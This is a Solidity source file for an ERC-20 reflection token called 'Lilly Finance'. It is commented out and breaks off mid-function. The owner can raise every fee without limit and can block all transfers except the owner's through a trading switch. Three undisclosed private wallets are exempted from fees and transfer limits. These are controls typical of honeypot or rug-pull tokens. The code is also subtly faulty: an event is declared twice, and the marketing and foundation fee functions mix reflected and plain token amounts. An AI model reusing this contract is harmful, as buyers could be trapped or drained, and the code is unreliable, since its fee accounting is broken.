1 /*
2 
3 pragma solidity ^0.8.11;
4 
5 interface IERC20 {
6     function totalSupply() external view returns (uint256);
7     function balanceOf(address account) external view returns (uint256);
8     function transfer(address recipient, uint256 amount) external returns (bool);
9     function allowance(address owner, address spender) external view returns (uint256);
10     function approve(address spender, uint256 amount) external returns (bool);
11     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
12     event Transfer(address indexed from, address indexed to, uint256 value);
13     event Approval(address indexed owner, address indexed spender, uint256 value);
14 
15         event Approval(address indexed owner, address indexed spender, uint256 value);
16 }
17 
18 library SafeMath {
19     function add(uint256 a, uint256 b) internal pure returns (uint256) {
20         uint256 c = a + b;
21         require(c >= a, "SafeMath: addition overflow");
22         return c;
23     }
24     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
25         return sub(a, b, "SafeMath: subtraction overflow");
26     }
27     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28         require(b <= a, errorMessage);
29         uint256 c = a - b;
30 
31         return c;
32     }
33     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
34         if (a == 0) {
35             return 0;
36         }
37         uint256 c = a * b;
38         require(c / a == b, "SafeMath: multiplication overflow");
39         return c;
40     }
41     function div(uint256 a, uint256 b) internal pure returns (uint256) {
42         return div(a, b, "SafeMath: division by zero");
43     }
44     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
45         require(b > 0, errorMessage);
46         uint256 c = a / b;
47         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
48         return c;
49     }
50     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
51         return mod(a, b, "SafeMath: modulo by zero");
52     }
53     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
54         require(b != 0, errorMessage);
55         return a % b;
56     }
57 }
58 
59 abstract contract Context {
60     function _msgSender() internal view virtual returns (address) {
61         return msg.sender;
62     }
63     function _msgData() internal view virtual returns (bytes memory) {
64         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
65         return msg.data;
66     }
67 }
68 
69 library Address {
70     function isContract(address account) internal view returns (bool) {
71         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
72         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
73         // for accounts without code, i.e. `keccak256('')`
74         bytes32 codehash;
75         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
76         // solhint-disable-next-line no-inline-assembly
77         assembly { codehash := extcodehash(account) }
78         return (codehash != accountHash && codehash != 0x0);
79     }
80     function sendValue(address payable recipient, uint256 amount) internal {
81         require(address(this).balance >= amount, "Address: insufficient balance");
82 
83         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
84         (bool success, ) = recipient.call{ value: amount }("");
85         require(success, "Address: unable to send value, recipient may have reverted");
86     }
87     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
88       return functionCall(target, data, "Address: low-level call failed");
89     }
90     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
91         return _functionCallWithValue(target, data, 0, errorMessage);
92     }
93     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
94         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
95     }
96     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
97         require(address(this).balance >= value, "Address: insufficient balance for call");
98         return _functionCallWithValue(target, data, value, errorMessage);
99     }
100     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
101         require(isContract(target), "Address: call to non-contract");
102         // solhint-disable-next-line avoid-low-level-calls
103         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
104         if (success) {
105             return returndata;
106         } else {
107             // Look for revert reason and bubble it up if present
108             if (returndata.length > 0) {
109                 // The easiest way to bubble the revert reason is using memory via assembly
110                 // solhint-disable-next-line no-inline-assembly
111                 assembly {
112                     let returndata_size := mload(returndata)
113                     revert(add(32, returndata), returndata_size)
114                 }
115             } else {
116                 revert(errorMessage);
117             }
118         }
119     }
120 }
121 
122 interface IUniswapV2Factory {
123     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
124     function feeTo() external view returns (address);
125     function feeToSetter() external view returns (address);
126     function getPair(address tokenA, address tokenB) external view returns (address pair);
127     function allPairs(uint) external view returns (address pair);
128     function allPairsLength() external view returns (uint);
129     function createPair(address tokenA, address tokenB) external returns (address pair);
130     function setFeeTo(address) external;
131     function setFeeToSetter(address) external;
132 }
133 interface IUniswapV2Pair {
134     event Approval(address indexed owner, address indexed spender, uint value);
135     event Transfer(address indexed from, address indexed to, uint value);
136     function name() external pure returns (string memory);
137     function symbol() external pure returns (string memory);
138     function decimals() external pure returns (uint8);
139     function totalSupply() external view returns (uint);
140     function balanceOf(address owner) external view returns (uint);
141     function allowance(address owner, address spender) external view returns (uint);
142     function approve(address spender, uint value) external returns (bool);
143     function transfer(address to, uint value) external returns (bool);
144     function transferFrom(address from, address to, uint value) external returns (bool);
145     function DOMAIN_SEPARATOR() external view returns (bytes32);
146     function PERMIT_TYPEHASH() external pure returns (bytes32);
147     function nonces(address owner) external view returns (uint);
148     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
149     event Mint(address indexed sender, uint amount0, uint amount1);
150     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
151     event Swap(
152         address indexed sender,
153         uint amount0In,
154         uint amount1In,
155         uint amount0Out,
156         uint amount1Out,
157         address indexed to
158     );
159     event Sync(uint112 reserve0, uint112 reserve1);
160     function MINIMUM_LIQUIDITY() external pure returns (uint);
161     function factory() external view returns (address);
162     function token0() external view returns (address);
163     function token1() external view returns (address);
164     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
165     function price0CumulativeLast() external view returns (uint);
166     function price1CumulativeLast() external view returns (uint);
167     function kLast() external view returns (uint);
168     function mint(address to) external returns (uint liquidity);
169     function burn(address to) external returns (uint amount0, uint amount1);
170     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
171     function skim(address to) external;
172     function sync() external;
173     function initialize(address, address) external;
174 }
175 
176 interface IUniswapV2Router01 {
177     function factory() external pure returns (address);
178     function WETH() external pure returns (address);
179     function addLiquidity(
180         address tokenA,
181         address tokenB,
182         uint amountADesired,
183         uint amountBDesired,
184         uint amountAMin,
185         uint amountBMin,
186         address to,
187         uint deadline
188     ) external returns (uint amountA, uint amountB, uint liquidity);
189     function addLiquidityETH(
190         address token,
191         uint amountTokenDesired,
192         uint amountTokenMin,
193         uint amountETHMin,
194         address to,
195         uint deadline
196     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
197     function removeLiquidity(
198         address tokenA,
199         address tokenB,
200         uint liquidity,
201         uint amountAMin,
202         uint amountBMin,
203         address to,
204         uint deadline
205     ) external returns (uint amountA, uint amountB);
206     function removeLiquidityETH(
207         address token,
208         uint liquidity,
209         uint amountTokenMin,
210         uint amountETHMin,
211         address to,
212         uint deadline
213     ) external returns (uint amountToken, uint amountETH);
214     function removeLiquidityWithPermit(
215         address tokenA,
216         address tokenB,
217         uint liquidity,
218         uint amountAMin,
219         uint amountBMin,
220         address to,
221         uint deadline,
222         bool approveMax, uint8 v, bytes32 r, bytes32 s
223     ) external returns (uint amountA, uint amountB);
224     function removeLiquidityETHWithPermit(
225         address token,
226         uint liquidity,
227         uint amountTokenMin,
228         uint amountETHMin,
229         address to,
230         uint deadline,
231         bool approveMax, uint8 v, bytes32 r, bytes32 s
232     ) external returns (uint amountToken, uint amountETH);
233     function swapExactTokensForTokens(
234         uint amountIn,
235         uint amountOutMin,
236         address[] calldata path,
237         address to,
238         uint deadline
239     ) external returns (uint[] memory amounts);
240     function swapTokensForExactTokens(
241         uint amountOut,
242         uint amountInMax,
243         address[] calldata path,
244         address to,
245         uint deadline
246     ) external returns (uint[] memory amounts);
247     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
248         external
249         payable
250         returns (uint[] memory amounts);
251     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
252         external
253         returns (uint[] memory amounts);
254     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
255         external
256         returns (uint[] memory amounts);
257     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
258         external
259         payable
260         returns (uint[] memory amounts);
261 
262     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
263     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
264     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
265     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
266     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
267 }
268 
269 interface IUniswapV2Router02 is IUniswapV2Router01 {
270     function removeLiquidityETHSupportingFeeOnTransferTokens(
271         address token,
272         uint liquidity,
273         uint amountTokenMin,
274         uint amountETHMin,
275         address to,
276         uint deadline
277     ) external returns (uint amountETH);
278     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
279         address token,
280         uint liquidity,
281         uint amountTokenMin,
282         uint amountETHMin,
283         address to,
284         uint deadline,
285         bool approveMax, uint8 v, bytes32 r, bytes32 s
286     ) external returns (uint amountETH);
287     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
288         uint amountIn,
289         uint amountOutMin,
290         address[] calldata path,
291         address to,
292         uint deadline
293     ) external;
294     function swapExactETHForTokensSupportingFeeOnTransferTokens(
295         uint amountOutMin,
296         address[] calldata path,
297         address to,
298         uint deadline
299     ) external payable;
300     function swapExactTokensForETHSupportingFeeOnTransferTokens(
301         uint amountIn,
302         uint amountOutMin,
303         address[] calldata path,
304         address to,
305         uint deadline
306     ) external;
307 }
308 
309 interface IWETH {
310     function deposit() external payable;
311     function balanceOf(address _owner) external returns (uint256);
312     function transfer(address _to, uint256 _value) external returns (bool);
313     function withdraw(uint256 _amount) external;
314 }
315 
316 
317 contract Ownable is Context {
318     address private _owner;
319     address private _previousOwner;
320     uint256 private _lockTime;
321 
322     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
323 
324     constructor () {
325         address msgSender = _msgSender();
326         _owner = msgSender;
327         emit OwnershipTransferred(address(0), msgSender);
328     }
329     function owner() public view returns (address) {
330         return _owner;
331     }
332     modifier onlyOwner() {
333         require(_owner == _msgSender(), "Ownable: caller is not the owner");
334         _;
335     }
336     function renounceOwnership() external virtual onlyOwner {
337         emit OwnershipTransferred(_owner, address(0));
338         _owner = address(0);
339         //The following line avoids exploiting previous lock/unlock to regain ownership
340         _previousOwner = address(0);
341     }
342     function transferOwnership(address newOwner) external virtual onlyOwner {
343         require(newOwner != address(0), "Ownable: new owner is the zero address");
344         emit OwnershipTransferred(_owner, newOwner);
345         _owner = newOwner;
346     }
347   
348 }
349 
350 contract Lilly is Context, IERC20, Ownable {
351     using SafeMath for uint256;
352     using Address for address;
353 
354     mapping (address => uint256) private _rOwned;
355     mapping (address => uint256) private _tOwned;
356     mapping (address => mapping (address => uint256)) private _allowances;
357 
358     mapping (address => bool) private _isExcludedFromFee;
359     mapping (address => bool) private _isExcludedFromReward;
360     mapping (address => bool) private _isExcludedFromMaxTxLimit;
361     address[] private _excludedAddressesFromReward;
362    
363     string constant private _name = "Lilly Finance";
364     string constant private _symbol = "Ly";
365     uint256 constant private _decimals = 9;
366 
367     uint256 private constant MAX = ~uint256(0);
368     uint256 private _tTotal = 120000000000000000  * 10**9;
369     uint256 private _rTotal = (MAX - (MAX % _tTotal));
370     uint256 private _tFeeTotal;
371     uint256 private _tBurnTotal;
372    
373     address payable public marketingAddress = payable(0x00000FBc142BA2dEEA360cE96221B3DB0CBeb46F);
374     address payable public foundationAddress = payable(0x0000c32154148eB90E8772A2109E14f7dff4B48F);
375     address public  deadAddress = 0x000143009CeA40a1256838D4EFdee6578066A57A;
376     address private wallet1 = 0x000e4c4Bdb9A1c39664CB99c79C7bAd827Ff7bC2;
377     address private wallet2 = 0x000b3bE0E22084588CcD36FcF0a506967f394FE6;
378     address private wallet3 = 0x000b3559305eB53f5A47b1173e6F0C968FCA68b6;
379   
380 
381     uint256 public _taxFee = 3;
382     uint256 private _previousTaxFee = _taxFee;
383     uint256 public _liquidityFee = 1;
384     uint256 private _previousLiquidityFee = _liquidityFee;
385     uint256 public _burnFee = 2;
386     uint256 private _previousBurnFee = _burnFee;
387     uint256 public _marketingFee= 3;
388     uint256 private _previousMarketingFee = _marketingFee;
389     uint256 public _foundationFee= 1;
390     uint256 private _previousfoundatoinFee = _foundationFee;
391 
392     IUniswapV2Router02 public immutable uniswapV2RouterObject;
393     address public immutable uniswapV2wETHAddr;
394     address public uniswapV2PairAddr;
395     address public immutable uniswapV2RouterAddr;
396     address constant private _blackholeZero = address(0);
397     address constant private _blackholeDead = 0x000000000000000000000000000000000000dEaD;
398     
399     bool inSwapAndLiquify;
400     bool public swapAndLiquifyEnabled = true;
401 
402     bool public tradingEnabled;
403     
404     uint256 public _maxTxAmount = _tTotal.div(100);
405     uint256 public numTokensSellToAddToLiquidity = 12000000000 * 10**9;
406     
407     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
408     event SwapAndLiquifyEnabledUpdated(bool enabled);
409     event SwapAndLiquify(
410         uint256 tokensSwapped,
411         uint256 ethReceived,
412         uint256 tokensIntoLiqudity
413     );
414     
415     modifier lockTheSwap {
416         inSwapAndLiquify = true;
417         _;
418         inSwapAndLiquify = false;
419     }
420     
421     constructor() {
422         _rOwned[_msgSender()] = _rTotal;
423 
424         address _uniswapV2RouterAddr=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
425 
426 
427         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddr);
428         uniswapV2RouterAddr = _uniswapV2RouterAddr;
429 		uniswapV2wETHAddr = _uniswapV2Router.WETH();
430          // Create a uniswap pair for this new token
431         uniswapV2PairAddr = IUniswapV2Factory(_uniswapV2Router.factory())
432             .createPair(address(this), _uniswapV2Router.WETH());
433         // set the rest of the contract variables
434         uniswapV2RouterObject = _uniswapV2Router;
435         
436         //exclude owner and this contract from fee
437         _isExcludedFromFee[owner()] = true;
438         _isExcludedFromFee[address(this)] = true;
439         _isExcludedFromFee[wallet1] = true;
440         _isExcludedFromFee[wallet2] = true;
441         _isExcludedFromFee[wallet3] = true;
442         _isExcludedFromFee[deadAddress] = true;
443         _isExcludedFromFee[marketingAddress] = true;
444         _isExcludedFromFee[foundationAddress] = true;
445 
446         _isExcludedFromMaxTxLimit[wallet1] = true;
447         _isExcludedFromMaxTxLimit[wallet2] = true;
448         _isExcludedFromMaxTxLimit[wallet3] = true;
449         _isExcludedFromMaxTxLimit[deadAddress] = true;
450         _isExcludedFromMaxTxLimit[marketingAddress] = true;
451         _isExcludedFromMaxTxLimit[foundationAddress] = true;
452         
453         emit Transfer(_blackholeZero, _msgSender(), _tTotal);
454 }
455     function enableTrading(bool trading) external onlyOwner
456     {
457         tradingEnabled = trading;
458     }
459 
460     function name() external pure returns (string memory) {
461         return _name;
462     }
463 
464     function symbol() external pure returns (string memory) {
465         return _symbol;
466     }
467 
468     function decimals() external pure returns (uint8) {
469         return uint8(_decimals);
470     }
471 
472     function totalSupply() external view override returns (uint256) {
473         return _tTotal;
474     }
475 
476     function balanceOf(address account) public view override returns (uint256) {
477         if (_isExcludedFromReward[account]) return _tOwned[account];
478         return tokenFromReflection(_rOwned[account]);
479     }
480 
481     function transfer(address recipient, uint256 amount) external override returns (bool) {
482         _transfer(_msgSender(), recipient, amount);
483         return true;
484     }
485 
486     function allowance(address owner, address spender) external view override returns (uint256) {
487         return _allowances[owner][spender];
488     }
489 
490     function approve(address spender, uint256 amount) external override returns (bool) {
491         _approve(_msgSender(), spender, amount);
492         return true;
493     }
494 
495     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
496         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
497         _transfer(sender, recipient, amount);
498         return true;
499     }
500 
501     function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
502         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
503         return true;
504     }
505 
506     function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
507         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
508         return true;
509     }
510 
511     function isExcludedFromReward(address account) external view returns (bool) {
512         return _isExcludedFromReward[account];
513     }
514 
515     function totalFees() internal view returns (uint256) {
516         return _taxFee.add(_liquidityFee).add(_burnFee).add(_marketingFee).add(_foundationFee);
517     }
518 
519     function deliver(uint256 tAmount) external {
520         address sender = _msgSender();
521         require(!_isExcludedFromReward[sender], "Excluded addresses cannot call this function");
522         (uint256 rAmount,,,,,,) = _getValues(tAmount);
523         _rOwned[sender] = _rOwned[sender].sub(rAmount);
524         _rTotal = _rTotal.sub(rAmount);
525         _tFeeTotal = _tFeeTotal.add(tAmount);
526     }
527 
528     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns(uint256) {
529         require(tAmount <= _tTotal, "Amount must be less than supply");
530         if (!deductTransferFee) {
531             (uint256 rAmount,,,,,,) = _getValues(tAmount);
532             return rAmount;
533         } else {
534             (,uint256 rTransferAmount,,,,,) = _getValues(tAmount);
535             return rTransferAmount;
536         }
537     }
538 
539     function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
540         require(rAmount <= _rTotal, "Amount must be less than total reflections");
541         uint256 currentRate =  _getRate();
542         return rAmount.div(currentRate);
543     }
544 
545     function excludeFromReward(address account) external onlyOwner() {
546       
547         require(!_isExcludedFromReward[account], "Account is already excluded");
548         if(_rOwned[account] > 0) {
549             _tOwned[account] = tokenFromReflection(_rOwned[account]);
550         }
551         _isExcludedFromReward[account] = true;
552         _excludedAddressesFromReward.push(account);
553     }
554 
555     function includeInReward(address account) external onlyOwner() {
556         require(_isExcludedFromReward[account], "Account is already excluded");
557         for (uint256 i = 0; i < _excludedAddressesFromReward.length; i++) {
558             if (_excludedAddressesFromReward[i] == account) {
559                 _excludedAddressesFromReward[i] = _excludedAddressesFromReward[_excludedAddressesFromReward.length - 1];
560                 _tOwned[account] = 0;
561                 _isExcludedFromReward[account] = false;
562                 _excludedAddressesFromReward.pop();
563                 break;
564             }
565         }
566     }
567    
568     //Allow excluding from fee certain contracts, usually lock or payment contracts, but not the router or the pool.
569     function excludeFromFee(address account) external onlyOwner {
570         if (account.isContract() && account != uniswapV2PairAddr && account != uniswapV2RouterAddr)
571         _isExcludedFromFee[account] = true;
572     }
573     // Do not include back this contract. Owner can renounce being feeless.
574     function includeInFee(address account) external onlyOwner {
575         if (account != address(this))
576         _isExcludedFromFee[account] = false;
577     }
578 
579     function includeInMaxTxLimit(address account) external onlyOwner
580     {
581         _isExcludedFromMaxTxLimit[account] = false;
582     }
583 
584     function excludeFromMaxTxLimit(address account) external onlyOwner
585     {
586         _isExcludedFromMaxTxLimit[account] = true;
587     }
588 
589     function changenumTokensSellToAddToLiquidity(uint256 num) external onlyOwner
590     {
591         numTokensSellToAddToLiquidity = num;
592     }
593     
594     function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
595         _taxFee = taxFee;
596     }
597     
598     function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
599         _liquidityFee = liquidityFee;
600     }
601     
602     function setMarketingPercent(uint256 MarketingFee) external onlyOwner() {
603         _marketingFee = MarketingFee;
604     }
605 
606     function setFoundationPercent(uint256 FoundationFee) external onlyOwner() {
607         _foundationFee = FoundationFee;
608     }
609 
610     function setBurnFeePercent(uint256 burnFee) external onlyOwner() {
611         _burnFee= burnFee;
612     }
613    
614     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
615         _maxTxAmount = _tTotal.mul(maxTxPercent).div(
616             10**2
617         );
618     }
619 
620     function setMarketingWallet(address wallet) external onlyOwner()
621     {
622         marketingAddress = payable(wallet);
623     }
624 
625     function setFoundationWallet(address wallet) external onlyOwner()
626     {
627         foundationAddress = payable(wallet);
628     }
629 
630     
631     function setDeadWallet(address wallet) external onlyOwner()
632     {
633         deadAddress = wallet;
634     }
635 
636     function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner() {
637         swapAndLiquifyEnabled = _enabled;
638         emit SwapAndLiquifyEnabledUpdated(_enabled);
639     }
640     
641     
642     receive() external payable {}
643 
644     function _reflectFee(uint256 rFee, uint256 tFee) private {
645         _rTotal = _rTotal.sub(rFee);
646         _tFeeTotal = _tFeeTotal.add(tFee);
647        
648     }
649 
650     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
651         (uint256 tTransferAmount, uint256 tFee, uint256 tBurn,uint256 tLiquidity) = _getTValues(tAmount);
652         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tBurn, tLiquidity, _getRate());
653         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tBurn, tLiquidity);
654     }
655 
656     function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
657         uint256 tFee = calculateTaxFee(tAmount);
658         uint256 tBurn = calculateBurnFee(tAmount);
659         uint256 tLiquidity = calculateLiquidityFee(tAmount);
660         uint256 tTransferAmount = tAmount.sub(tFee).sub(tBurn).sub(tLiquidity);
661         return (tTransferAmount, tFee, tBurn, tLiquidity);
662     }
663 
664     function _getRValues(uint256 tAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
665         uint256 rAmount = tAmount.mul(currentRate);
666         uint256 rFee = tFee.mul(currentRate);
667         uint256 rBurn = tBurn.mul(currentRate);
668         uint256 rLiquidity = tLiquidity.mul(currentRate);
669         uint256 totalTax = rFee.add(rBurn).add(rLiquidity);
670         uint256 rTransferAmount = rAmount.sub(totalTax);
671         return (rAmount, rTransferAmount, rFee);
672     }
673 
674     function _getRate() private view returns(uint256) {
675         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
676         return rSupply.div(tSupply);
677     }
678 
679     function _getCurrentSupply() private view returns(uint256, uint256) {
680         uint256 rSupply = _rTotal;
681         uint256 tSupply = _tTotal;      
682         for (uint256 i = 0; i < _excludedAddressesFromReward.length; i++) {
683             if (_rOwned[_excludedAddressesFromReward[i]] > rSupply || _tOwned[_excludedAddressesFromReward[i]] > tSupply) return (_rTotal, _tTotal);
684             rSupply = rSupply.sub(_rOwned[_excludedAddressesFromReward[i]]);
685             tSupply = tSupply.sub(_tOwned[_excludedAddressesFromReward[i]]);
686         }
687         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
688         return (rSupply, tSupply);
689     }
690     
691     
692     
693     function calculateTaxFee(uint256 _amount) private view returns (uint256) {
694         return _amount.mul(_taxFee).div(
695             10**2
696         );
697     }
698 
699     function calculateBurnFee(uint256 _amount) private view returns (uint256) {
700     
701      return _amount.mul(_burnFee).div(10**2);
702     
703     }
704 
705     function calculateMarketingFee(uint256 _amount) private view returns (uint256) {
706         return _amount.mul(_marketingFee).div(
707             10**2
708         );
709     }
710 
711      function calculateFoundationFee(uint256 _amount) private view returns (uint256) {
712         return _amount.mul(_foundationFee).div(
713             10**2
714         );
715     }
716 
717      function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
718         return _amount.mul(_liquidityFee).div(
719             10**2
720         );
721     }
722 
723     function _takeLiquidity(uint256 tLiquidity) private {
724         uint256 currentRate =  _getRate();
725         uint256 rLiquidity = tLiquidity.mul(currentRate);
726         _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
727         if(_isExcludedFromReward[address(this)])
728             _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
729     }
730 
731     function _takeBurn(address sender, uint256 tBurn) private {
732         
733         _tOwned[deadAddress] = _tOwned[deadAddress].add(tBurn);
734         if(tBurn > 0)
735         {emit Transfer(sender, deadAddress, tBurn);}
736          
737     }
738     
739     function _takeMarketing(address sender, uint256 tMarketing) private returns(uint256){
740       uint256 rMarketing = calculateMarketingFee(tMarketing);
741       _rOwned[address(this)] = _rOwned[address(this)].add(rMarketing);
742       _rOwned[sender] = _rOwned[sender].sub(rMarketing);
743       emit Transfer(sender, address(this), rMarketing);
744          if(_isExcludedFromReward[address(this)])
745             _tOwned[address(this)] = _tOwned[address(this)].add(tMarketing);
746       return rMarketing;
747     }
748 
749     function _takeFoundation(address sender, uint256 tFoundation) private returns(uint256){
750       uint256 rFoundation = calculateFoundationFee(tFoundation);
751       _rOwned[address(this)] = _rOwned[address(this)].add(rFoundation);
752       _rOwned[sender] = _rOwned[sender].sub(rFoundation);
753       emit Transfer(sender, address(this), rFoundation);
754          if(_isExcludedFromReward[address(this)])
755             _tOwned[address(this)] = _tOwned[address(this)].add(tFoundation);
756       return rFoundation;
757     }
758     
759     
760     function removeAllFee() private {
761         if(_taxFee == 0 && _burnFee == 0 && _liquidityFee == 0) return;
762         
763         _previousTaxFee = _taxFee;
764         _previousBurnFee = _burnFee;
765         _previousLiquidityFee = _liquidityFee;
766         
767         _taxFee = 0;
768         _burnFee = 0;
769         _liquidityFee = 0;
770     }
771     
772     function restoreAllFee() private {
773         _taxFee = _previousTaxFee;
774         _burnFee = _previousBurnFee;
775         _liquidityFee = _previousLiquidityFee;
776     }
777 
778     
779 
780     function isExcludedFromFee(address account) public view returns(bool) {
781         return _isExcludedFromFee[account];
782     }
783 
784     function _approve(address owner, address spender, uint256 amount) private {
785         require(owner != address(0), "ERC20: approve from the zero address");
786         require(spender != address(0), "ERC20: approve to the zero address");
787 
788         _allowances[owner][spender] = amount;
789         emit Approval(owner, spender, amount);
790     }
791 
792     function _transfer(
793         address from,
794         address to,
795         uint256 amount
796     ) private {
797         require(from != address(0), "ERC20: transfer from the zero address");
798         require(to != address(0), "ERC20: transfer to the zero address");
799         require(amount > 0, "Transfer amount must be greater than zero");
800         if(from != owner()) {require(tradingEnabled, "Trading is not enabled yet");}
801         if(from != owner() && to != owner())
802         {
803             if(!_isExcludedFromMaxTxLimit[from]){
804             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");}
805         }
806      //indicates if fee should be deducted from transfer
807         uint8 takeFee = 1;
808         
809           // is the token balance of this contract address over the min number of
810         // tokens that we need to initiate a swap + liquidity lock?
811         // also, don't get caught in a circular liquidity event.
812         // also, don't swap & liquify if sender is uniswap pair.
813         uint256 contractTokenBalance = balanceOf(address(this));
814      
815         if(contractTokenBalance >= _maxTxAmount)
816         {
817             contractTokenBalance = _maxTxAmount;
818         }
819         
820         bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
821         if (
822             overMinTokenBalance &&
823             !inSwapAndLiquify &&
824             from != uniswapV2PairAddr &&
825             swapAndLiquifyEnabled &&
826 			takeFee == 1 //avoid costly liquify on p2p sends
827         ) {
828             //add liquidity
829             swapAndLiquify(contractTokenBalance);
830         }
831        
832 
833        
834         //if any account belongs to _isExcludedFromFee account then remove the fee
835         if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
836             takeFee = 0;
837         }
838 
839         if(from != uniswapV2PairAddr && to != uniswapV2PairAddr)
840         {
841             takeFee = 0;
842         }
843 
844        
845         if(takeFee == 1)
846         {
847         uint256 marketingAmount = _takeMarketing(from, amount);
848         uint256 foundationAmount = _takeFoundation(from, amount);
849         amount = amount - (marketingAmount+foundationAmount);}
850 
851       
852         //transfer amount, it will take tax, burn, liquidity fee
853         _tokenTransfer(from,to,amount,takeFee);
854     }
855 
856     
857 	
858     function swapAndLiquify(uint256 tokensToLiquify) private lockTheSwap {
859         
860         uint256 tokensToLP = tokensToLiquify.mul(_liquidityFee).div(totalFees()).div(2);
861         uint256 amountToSwap = tokensToLiquify.sub(tokensToLP);
862 
863         address[] memory path = new address[](2);
864         path[0] = address(this);
865         path[1] = uniswapV2wETHAddr;
866 
867         _approve(address(this), address(uniswapV2RouterAddr), tokensToLiquify);
868         uniswapV2RouterObject.swapExactTokensForETHSupportingFeeOnTransferTokens(
869             amountToSwap,
870             0,
871             path,
872             address(this),
873             block.timestamp
874         );
875 
876         uint256 ethBalance = address(this).balance;
877         uint256 ethFeeFactor = totalFees().sub((_liquidityFee).div(2));
878 
879         uint256 ethForLiquidity = ethBalance.mul(_liquidityFee).div(ethFeeFactor).div(2);
880         uint256 ethForMarketing = ethBalance.mul(_marketingFee).div(ethFeeFactor);
881         uint256 ethForFounders = ethBalance.mul(_foundationFee).div(ethFeeFactor);
882      
883         addLiquidity(tokensToLP, ethForLiquidity);
884 
885         payable(marketingAddress).transfer(ethForMarketing);
886         payable(foundationAddress).transfer(ethForFounders);
887        
888     }
889 
890     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
891         // approve token transfer to cover all possible scenarios
892         _approve(address(this), address(uniswapV2RouterAddr), tokenAmount);
893 
894         // add the liquidity
895         uniswapV2RouterObject.addLiquidityETH{value: ethAmount}(
896             address(this),
897             tokenAmount,
898             0, // slippage is unavoidable
899             0, // slippage is unavoidable
900             owner(),
901             block.timestamp
902         );
903     }
904 
905     //this method is responsible for taking all fee, if takeFee is true
906     function _tokenTransfer(address sender, address recipient, uint256 amount,uint8 feePlan) private {
907         if(feePlan == 0) //no fees
908             removeAllFee();
909         
910         if (_isExcludedFromReward[sender] && !_isExcludedFromReward[recipient]) {
